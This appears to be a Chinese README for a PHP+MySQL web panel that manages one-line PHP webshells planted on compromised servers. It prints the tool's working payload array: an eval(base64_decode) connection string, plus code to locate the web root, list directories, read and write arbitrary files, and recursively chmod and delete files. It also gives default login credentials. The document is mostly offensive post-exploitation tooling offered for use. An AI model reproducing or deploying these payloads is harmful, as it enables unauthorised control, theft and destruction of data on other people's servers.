## WebshellManager

> 一款无聊的时候用PHP+Mysql写的一句话WEB端管理工具 名字叫w8ay好了 

## 介绍

- 目前仅支持对PHP的一句话进行操作
- 完成文件管理，支持对webshell中的文件进行增、删、改、查操作 可多选操作
- 支持自定义命令
- 完成多用户系统 注册 登陆


##自定义PHP命令

第二版本完成了自定义命令 在`include\model\PHPShell_Build_mothod.php`中自定义命令即可，将自动完成编码加密过程

```
var $phpshell = array(
		'link' => '{PASS}=%40eval%01%28base64_decode%28%24_POST%5Bz0%5D%29%29%3B&z0=',//连接前缀

		'safe' => "@ini_set('display_errors','0');@set_time_limit(0);@set_magic_quotes_runtime(0);",//payload前缀

		'flag_left' => 'echo("->|");',//左标志位

		'flag_right' => 'echo("|<-");die();',//右标志位

		'GetWebRoot' => '$D=dirname($_SERVER["SCRIPT_FILENAME"]);if($D==""){$D=dirname($_SERVER["PATH_TRANSLATED"]);}$arr = array("WebRoot" => $D);echo json_encode($arr);',//获取一句话目录
		
		'GetWebDiskFileList' => '$D=base64_decode($_POST["z1"]);$F=opendir($D);
if($F==NULL){echo("ERROR:// Path Not Found Or No Permission!");}else{$tmparr = array();	while($N=readdir($F)){$P=$D."/".$N;$T=date("Y-m-d H:i:s",filemtime($P));$E=substr(base_convert(fileperms($P),10,8),-4);$arr = array("time" => $T, "size" => filesize($P),"root" => $E,"path" =>urlencode(is_dir($P)?$N."/":$N));$tmparr[] = $arr;}echo json_encode($tmparr);closedir($F);};',//获取磁盘文件
		
		'GetWebFileContent' => '$F=base64_decode($_POST["z1"]);$P=@fopen($F,"r");echo(@fread($P,filesize($F)));@fclose($P);',//得到文件内容

		'CreateAndSaveFile' => 'echo @fwrite(fopen(base64_decode($_POST["z1"]),"w"),base64_decode($_POST["z2"]))?"1":"0";',//创建文件

		'DeleteFile' => 'function df($p){$m=@dir($p);while(@$f=$m->read()){$pf=$p."/".$f;if((is_dir($pf))&&($f!=".")&&($f!="..")){@chmod($pf,0777);df($pf);}if(is_file($pf)){@chmod($pf,0777);@unlink($pf);}}$m->close();@chmod($p,0777);return @rmdir($p);}$F=get_magic_quotes_gpc()?stripslashes($_POST["z1"]):$_POST["z1"];if(is_dir($F))echo(df($F));else{echo(file_exists($F)?@unlink($F)?"1":"0":"0");}',//删除文件
		);
```


## 截图

![](https://cloud.githubusercontent.com/assets/18695984/20028030/ab8cc3cc-a360-11e6-999b-c3cdc93cdef5.jpg)
![](https://cloud.githubusercontent.com/assets/18695984/20028031/aed8235a-a360-11e6-8c86-635d0714eb51.jpg)
![](https://cloud.githubusercontent.com/assets/18695984/19856900/797cceb6-9fb6-11e6-85b3-762c3f3b77d0.jpg)
![](https://cloud.githubusercontent.com/assets/18695984/19856909/8126a13c-9fb6-11e6-9251-8db0424e4f2b.jpg)


## 安装

- 导入文件中的 w8_webshell.sql  
- 按注释修改 config.php  
- 安装成功  
- 默认账号密码 w8ay@qq.com w8ay
